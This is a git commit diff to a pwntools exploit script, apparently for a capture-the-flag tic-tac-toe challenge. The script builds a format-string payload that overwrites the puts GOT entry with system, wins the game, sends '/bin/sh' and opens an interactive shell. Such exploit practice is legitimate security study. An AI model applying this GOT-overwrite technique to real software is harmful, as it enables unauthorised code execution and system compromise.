f01ac547f92ab7b355396b7153b77b3a410863ec
mc-cat-tty <44820563+mc-cat-tty@users.noreply.github.com>
2025-05-22 18:34:15 +0200

    [Pwn] Improve script

--- pwn/scripts/tictactoe.py
+++ pwn/scripts/tictactoe.py
@@ -28,18 +28,24 @@ def search_offset(app, data):
 
 def main():
   app = get_target()
-  app.recvuntil(b"Your move: ")
   elf = ELF(BIN)
   addr_offset = search_offset(app, 'AAAA')
   fmt_str = fmtstr_payload(addr_offset, {elf.got.puts: elf.plt.system})
+  app.recvuntil(b"Your move: ")
   app.sendline(fmt_str)
   
-  for i in range(1, 4):
-    app.recvuntil(b"Your move: ")
-    app.sendline(str(i).encode())
+  for i in range(1, 10):
+    line = app.recvuntil([b"Your move: ", b"win", b"won"])
+    if b"You win" in line:
+      app.sendline(b"/bin/sh")
+      app.interactive()
+    elif b"I won" in line:
+      print("Retry...")
+      return
+    else:
+      app.sendline(str(i).encode())
 
-  app.sendline(b"/bin/sh")
-  app.interactive()
+
 
 if __name__ == "__main__":
   main()
